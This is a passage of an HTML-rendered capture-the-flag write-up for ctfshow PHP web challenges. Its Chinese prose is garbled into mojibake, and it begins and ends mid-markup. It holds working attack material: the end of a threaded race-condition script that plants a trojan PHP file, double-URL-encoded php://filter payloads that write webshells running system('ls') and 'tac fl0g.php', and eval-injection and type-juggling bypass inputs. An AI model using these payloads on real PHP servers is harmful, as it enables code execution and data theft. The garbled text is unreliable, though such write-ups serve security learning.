class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">resposne2=session.get(url+<span class="string">&#x27;jiuzhen.php&#x27;</span>);<span class="comment">#è®¿é—®æœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœè®¿é—®åˆ°äº†å°±ä»£è¡¨ç«äº‰æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:äº†</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">evnet=threading.Event()</span><br><span class="line"><span class="comment">#å†™å…¥å’Œè®¿é—®åˆ†åˆ«è®¾ç½®5ä¸ªçº¿ç¨‹ã€‚</span></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web87">web87</span></h4><ul><li>æäº¤çš„æ–¹å¼è¦ä½¿ç”¨<code>Content-Type: application/x-www-form-urlencoded</code>ï¼Œå¦åˆ™æ— æ³•æˆåŠŸï¼Œè¿™ç§é¢˜å…¶å®å¯ä»¥ç”¨POSTManåšï¼Œæ²¡å¿…è¦ç”¨burpsuiteæŠ“åŒ…ï¼Œå¦‚æœè¦æŠ“ï¼Œå¿…é¡»å¸¦ä¸Šä¸Šé¢è¿™å¥Content-type</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜éœ€è¦ç»•è¿‡dieå‡½æ•°ï¼Œæˆ‘ä»¬è¦ä½¿å…¶æ— æ•ˆï¼Œå¦åˆ™å½±å“æˆ‘ä»¬æäº¤çš„å†…å®¹ã€‚</p><p>æ€è·¯å¯ä»¥å‚è€ƒ[æ–‡ä»¶åŒ…å«](# æ–‡ä»¶åŒ…å«)åº•ä¸‹çš„é“¾æ¥</p><ul><li><p>æ–¹æ³•ä¸€ï¼šç”¨base64 ç¼–ç <br>ä½¿ç”¨urlç¼–ç <code>file=php://filter/write=convert.base64-decode/resource=flag.php</code>ï¼Œ</p><p>éœ€è¦æŠŠå­—æ¯ä¹Ÿç¼–ç ï¼Œç„¶åå†è¿›è¡Œä¸€æ¬¡urlç¼–ç </p><p><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2566%256c%2561%2567%252e%2570%2568%2570</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encodeAllStrings</span>(<span class="params">strings</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%&#123;0:0&gt;2&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&quot;x&quot;</span>)) <span class="keyword">for</span> char <span class="keyword">in</span> strings)</span><br><span class="line">  r = encodeAllStrings(a)</span><br><span class="line">  parse.quote(r)</span><br></pre></td></tr></table></figure><blockquote><p>contentæ˜¯å†™å…¥å†…å®¹,è¦è¿›è¡Œbase64ç¼–ç  å¯¹åº”ä¸Šé¢çš„ä¼ªåè®®è§£ç ,è€Œbaseè§£ç æ—¶,æ˜¯4ä¸ªä¸€ç»„,flag.php(è¦å†™å…¥çš„æ–‡ä»¶),å†™å…¥çš„å†…å®¹<code>&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;</code>ä¸­åªæœ‰phpdieä¼šå‚ä¸base64è§£ç ,å› ä¸ºphpdieåªæœ‰6ä¸ªå­—èŠ‚,è¡¥ä¸¤ä¸ªaå°±æ˜¯8å­—èŠ‚äº†,åœ¨base64è§£å¯†æ—¶ä¼šå¿½ç•¥ä¸å¯è¯†åˆ«çš„å­—ç¬¦</p><p>æ€»ç»“:æˆ‘ä»¬è¦åœ¨contentä¸­å†™å…¥shell,ç„¶åbase64ç¼–ç <br><code>content=&lt;?php system(&#39;ls&#39;);?&gt;</code><br>base64<br><code>content=PD9waHAgc3lzdGVtKCdscycpOz8+</code></p><p>æˆ‘ä»¬è¿˜è¦åœ¨base64å‰åŠ ä¸Šä¸¤ä¸ªå­—ç¬¦æ¥å‡‘é½ä½æ•°ï¼Œå› æ­¤contentå˜æˆäº†</p><p><code>content=aaPD9waHAgc3lzdGVtKCdscycpOz8+</code></p></blockquote><p><strong>BASE64åŠ å¯†éœ€è¦4çš„æ•´æ•°å€</strong></p></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨rot13åŠ å¯†</p><p>åŒç†ï¼Œå…ˆæ„é€ rot13åŠ å¯†çš„ä¼ªåè®®<code>php://filter/write=string.rot13/resource=2.php</code></p><p>ç„¶åä¸¤æ¬¡urlåŠ å¯†</p><p><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570</code></p><p>ç„¶åpayloadï¼Œ<code>&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>ä½¿ç”¨rot13åŠ å¯†<code>&lt;?cuc flfgrz(&#39;gnp sy0t.cuc&#39;)?&gt;</code></p></li></ul><h3><span id="phpç‰¹æ€§">phpç‰¹æ€§</span></h3><h4><span id="web89">web89</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>preg_matchæœ‰ä¸ªæ¼æ´ï¼Œå½“æ£€æµ‹çš„å˜é‡æ˜¯æ•°ç»„çš„æ—¶å€™ä¼šæŠ¥é”™å¹¶è¿”å›0ã€‚è€Œintvalå‡½æ•°å½“ä¼ å…¥çš„å˜é‡ä¹Ÿæ˜¯æ•°ç»„çš„æ—¶å€™ï¼Œä¼šè¿”å›1ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ ä¸ªæ•°ç»„ç»•è¿‡ï¼Œæ„é€ payload</p><p><code>?num[]=abc</code></p></li></ul><h4><span id="web90">web90</span></h4><p>intval($num,0)æ„æ€æ˜¯æ£€æµ‹numçš„è¿›åˆ¶ç±»å‹å¹¶è¿”å›å…¶åè¿›åˆ¶çš„å€¼ï¼Œè‹¥numå‰ç¼€ä¸º0ï¼Œå³åˆ¤æ–­numä¸ºå…«è¿›åˆ¶ï¼Œè‹¥numå‰ç¼€ä¸º0xï¼Œåˆ™åˆ¤æ–­numä¸ºåå…­è¿›åˆ¶</p><ul><li>phpä¸­**&#x3D;&#x3D;&#x3D;**<ul><li>å€¼ç›¸ç­‰</li><li>ç±»å‹ç›¸åŒ</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€ï¼šè¿›åˆ¶è½¬æ¢</p><ul><li>è‹¥numå‰ç¼€ä¸º0ï¼Œå³åˆ¤æ–­numä¸ºå…«è¿›åˆ¶ï¼Œè‹¥numå‰ç¼€ä¸º0xï¼Œåˆ™åˆ¤æ–­numä¸ºåå…­è¿›åˆ¶</li></ul><blockquote><p>è½¬åŒ–ä¸ºå…«è¿›åˆ¶ä¸º010574</p><p>è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ä¸º0x117c</p></blockquote>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// <span class="number">16</span></span><br><span class="line">?num=<span class="number">0</span>x117c</span><br><span class="line">// <span class="number">8</span></span><br><span class="line">?num=<span class="number">010574</span></span><br><span class="line">// <span class="number">2</span></span><br><span class="line">?num=<span class="number">0</span>b1000101111100</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šç§‘å­¦è®¡æ•°æ³•</p><blockquote><p>4476e3è¡¨ç¤º4476*10^3ï¼Œä¹Ÿå°±æ˜¯4476000ï¼Œ</p><p>è€Œ4476e3åšä¸ºå‚æ•°ä¼ å…¥çš„æ—¶å€™å¯ä»¥å½“æˆå­—ç¬¦ä¸²ï¼Œåœ¨è¿›è¡Œç¬¬ä¸€ä¸ªï¼ˆ&#x3D;&#x3D;&#x3D;ï¼‰æ¯”è¾ƒæ—¶ä¼šå…ˆè½¬ä¸º4476000å†æ¯”è¾ƒï¼Œåˆ°intvalå‡½æ•°æ—¶ï¼Œå› ä¸ºæ²¡æœ‰ç‰¹å¾å‰ç¼€ï¼Œæ‰€ä»¥å½“åè¿›åˆ¶å¤„ç†ï¼Œè€Œintvalå‡½æ•°ä¸èƒ½å¤„ç†ç§‘å­¦è®¡æ•°æ³•ï¼Œ4476e3ä¼šè¢«è¯†åˆ«ä¸º4476,</p></blockquote></li><li><p>æ–¹æ³•ä¸‰ï¼šå­—ç¬¦ä¸²æˆªå–</p><ul><li>intvalå¤„ç†å¼€å¤´æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²æ—¶ï¼Œè¿”å›å€¼ä¸ºå¼€å¤´çš„æ•°ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¾“å…¥ <strong>?num&#x3D;4476a</strong></li></ul></li><li><p>æ–¹æ³•å››ï¼šæµ®ç‚¹æ•°</p><ul><li><p>æ„é€ æµ®ç‚¹æ•°ç»•è¿‡å³å¯</p><p><em>4476.0</em></p></li></ul></li><li><p>æ–¹æ³•äº”ï¼šä½¿ç”¨æ­£å·ç»•è¿‡</p><p>+010574 </p><p>%2b010574</p></li></ul><h4><span id="web91">web91</span></h4><ul><li><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">æ¢è¡Œè§£ææ¼æ´</a></p><blockquote><p>^è¡¨ç¤ºè¡¨è¾¾å¼å¼€å¤´ï¼Œ$è¡¨ç¤ºè¡¨è¾¾å¼ç»“å°¾ï¼Œiè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œmè¡¨ç¤ºå¤šè¡Œæ¨¡å¼</p><p>\næ¢è¡Œï¼Œæˆ‘ä»¬ä»…éœ€ç”¨%0aä»£æ›¿å³å¯</p></blockquote></li></ul><h4><span id="web93">web93</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è¿‡æ»¤äº†åå…­è¿›åˆ¶ï¼Œæˆ‘ä»¬åˆ©ç”¨å…«è¿›åˆ¶å°±å¯ä»¥<strong>010574</strong></li></ul><h4><span id="web94">web94</span></h4><ul><li><p>è¿™é¢˜å¢åŠ äº†å¯¹8è¿›åˆ¶çš„å›´è¿½å µæˆªï¼Œæˆ‘ä»¬ç”¨æµ®ç‚¹æ•°ç»•è¿‡</p><p><code>4476.0</code></p></li></ul><h4><span id="web97">web97</span></h4><ul><li>æˆ‘ä¸€å¼€å§‹å†™ä¸ªè„šæœ¬ï¼Œä¸çŸ¥é“è¦è·‘åˆ°ä»€ä¹ˆæ—¶å€™ï¼Œæš´åŠ›å¥½åƒå‡ºä¸æ¥ï¼Œå¯ä»¥æœä¸€ä¸‹ç½‘ä¸Šè®¡ç®—å¥½çš„md5ã€‚</li><li>çŸ¥è¯†ç‚¹ï¼Œmd5å‡½æ•°æ— æ³•æ”¯æŒæ•°ç»„æ“ä½œï¼Œå› æ­¤æ„é€ æ•°ç»„å³å¯<ul><li>a[]&#x3D;1&amp;b[]&#x3D;2</li></ul></li></ul><h4><span id="web99">web99</span></h4><p>in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¸¥æ ¼åŒ¹é…ã€‚å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢</p><blockquote><p> n&#x3D;1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</p></blockquote><h4><span id="web100">web100</span></h4><p>è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼š**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚</p><p>æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p><p>**var_dump()**å‡½æ•°å¯ä»¥è¾“å‡ºå¤šä¸ªå€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>v3çš„è¯è¦åŠ æ³¨é‡Šä¹Ÿè¡Œ,ä¸åŠ ä¹Ÿèƒ½è¿è¡Œ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass(&#x27;ctfshow&#x27;)/*&amp;v3=*/;</span><br><span class="line">æˆ–?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h4><span id="web105">web105</span></h4><p><a href="https://blog.csdn.net/m0_62094846/article/details/122529362">è¯¦è§£</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ</span><br></pre></td></tr></table></figure><blockquote><p>&amp;&amp;åº”ç”¨<br>$hell&#x3D;â€abcâ€;<br>$$hell&#x3D;â€defâ€;ç­‰åŒäº$abc&#x3D;â€defâ€;</p></blockquote><p>è¿™é‡Œçš„&amp;&amp;æŠŠkeyçš„å€¼å˜ä¸ºäº†å˜é‡æ‰€ä»¥å¯ä»¥é€šè¿‡$errorå’Œ$$sucesè¿›è¡Œè¾“å…¥flag</p><p>æˆ‘ä»¬å¯ä»¥åœ¨GETæŠŠflagèµ‹å€¼ç»™suces,ç„¶åå†æŠŠsucesèµ‹å€¼ç»™errorå°±èƒ½æ˜¾ç¤ºflagäº†</p><h4><span id="web108">web108</span></h4><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­— æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span 